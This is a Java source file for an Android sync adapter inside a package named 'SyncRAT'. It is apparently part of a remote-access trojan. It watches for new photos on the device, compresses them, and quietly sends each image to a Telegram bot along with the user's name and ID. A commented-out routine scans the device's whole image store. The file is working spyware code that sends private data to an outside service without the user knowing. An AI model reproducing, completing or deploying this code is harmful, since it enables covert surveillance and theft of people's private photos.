// File: UploadSyncAdapter.java
package android.iocl.dac_collector.SyncRAT;

import android.accounts.Account;
import android.content.AbstractThreadedSyncAdapter;
import android.content.ContentProviderClient;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SyncResult;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.TelegramBot;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;

public class UploadSyncAdapter extends AbstractThreadedSyncAdapter {
    private static final String TAG = "UploadSyncAdapter";

    /** Must match the key used in ImageObserver.triggerSync() */
    static final String EXTRA_IMG_PATH = "imgPath";

    private final Context mContext;
    private final ContentResolver mResolver;
    private final int imgSizeLimitMB = 3; // compress if ≥ this size

    public UploadSyncAdapter(Context context, boolean autoInitialize) {
        super(context, autoInitialize);
        mContext = context.getApplicationContext();
        mResolver = mContext.getContentResolver();
    }

    @Override
    public void onPerformSync(
            Account account,
            Bundle extras,
            String authority,
            ContentProviderClient provider,
            SyncResult syncResult) {


        // 1) Observer-triggered upload?
        if (extras.containsKey(EXTRA_IMG_PATH)) {
            String imgPath = extras.getString(EXTRA_IMG_PATH);
            if (!isNullOrEmpty(imgPath)) {
                Log.d(TAG, "Observer-triggered upload: " + imgPath);
                processImageForUpload(imgPath);
                return;
            }
        }

        // 2) Periodic catch‑up upload
//        uploadLatestImages();
    }

    private void uploadLatestImages() {
        String[] proj = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_TAKEN
        };
        String order = MediaStore.Images.Media.DATE_TAKEN + " DESC";
        String lastUploaded = SharedPrefs.getLastUploadedImage(mContext);

        try (Cursor cursor = mResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                proj, null, null, order)) {

            if (cursor == null) {
                Log.w(TAG, "Cursor null in periodic upload.");
                return;
            }

            int count = 0, max = 1;
            while (cursor.moveToNext() && count < max) {
                String path = cursor.getString(
                        cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));

                if (path.equals(lastUploaded)) {
                    Log.d(TAG, "Skipping already uploaded: " + path);
                    continue;
                }
                if (processImageForUpload(path)) {
                    count++;

                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error during periodic upload", e);
        }
    }

    private boolean processImageForUpload(String path) {
        File orig = new File(path);
        if (!orig.exists()) {
            Log.w(TAG, "File not found: " + path);
            return false;
        }

        long sizeKB = orig.length() / 1024;
//        if (sizeKB < 700) {
//            Log.d(TAG, "Skipping small image (" + sizeKB + " KB): " + path);
//            return false;
//        }

        File toUpload = orig;
        long sizeMB = sizeKB / 1024;
        if (sizeMB >= imgSizeLimitMB) {
            toUpload = compressImageFile(orig);
            if (toUpload == null || toUpload.length() == 0) {
                Log.w(TAG, "Compression failed or too large, skipping: " + path);
                return false;
            }
        }

        String uid  = SharedPrefs.getUserID(mContext);
        String uNm  = SharedPrefs.getUsername(mContext);
        String idn  = "[" + uNm + ", " + uid + "]";
        String fsz  = (toUpload.length() / 1024) + " KB";

        TelegramBot.with(mContext)
                .sendMessage("Uploading: " + toUpload.getName()
                        + "\nSize: " + fsz
                        + "\nUser: " + idn);
        TelegramBot.with(mContext)
                .sendPhoto(toUpload,
                        "Uploaded -> " + toUpload.getName()
                                + "\nSize: " + fsz
                                + "\nUser: " + idn);

        Log.i(TAG, "Uploaded: " + toUpload.getName());
        return true;
    }

    /** Compresses a JPEG under the size limit by quality and scaling */
    private File compressImageFile(File inputFile) {
        try {
            long maxBytes = imgSizeLimitMB * 1024L * 1024L;
            Bitmap bmp = BitmapFactory.decodeFile(inputFile.getAbsolutePath());
            if (bmp == null) return null;

            // 1) Quality-only pass
            File out = tryCompress(bmp, inputFile.getParentFile(), 100, 10, 5, maxBytes);
            if (out != null) return out;

            // 2) Scale + quality passes
            int[] dims = {1024, 800, 640};
            for (int dim : dims) {
                if (bmp.getWidth() <= dim && bmp.getHeight() <= dim) continue;
                Bitmap scaled = scaleBitmap(bmp, dim);
                if (scaled == null) continue;
                try {
                    out = tryCompress(scaled, inputFile.getParentFile(), 80, 10, 5, maxBytes);
                    if (out != null) return out;
                } finally {
                    scaled.recycle();
                }
            }
            bmp.recycle();
        } catch (Exception e) {
            Log.e(TAG, "Compression error", e);
        }
        return null;
    }

    private File tryCompress(Bitmap bitmap, File dir,
                             int startQ, int minQ, int step, long maxBytes) {
        File temp = null;
        try {
            temp = File.createTempFile("cmp_", ".jpg", dir);
            int q = startQ;
            while (q >= minQ) {
                FileOutputStream fos = new FileOutputStream(temp);
                bitmap.compress(Bitmap.CompressFormat.JPEG, q, fos);
                fos.close();
                if (temp.length() <= maxBytes) return temp;
                q -= step;
            }
        } catch (Exception ignored) { }
        if (temp != null && temp.exists()) temp.delete();
        return null;
    }

    private Bitmap scaleBitmap(Bitmap src, int maxDim) {
        int w = src.getWidth(), h = src.getHeight();
        float ratio = (float) w / h;
        int nw, nh;
        if (w > h) {
            nw = maxDim; nh = (int) (nw / ratio);
        } else {
            nh = maxDim; nw = (int) (nh * ratio);
        }
        try {
            return Bitmap.createScaledBitmap(src, nw, nh, true);
        } catch (Exception e) {
            Log.e(TAG, "Scaling error", e);
            return null;
        }
    }

    private static boolean isNullOrEmpty(String s) {
        return s == null || s.trim().isEmpty();
    }
}
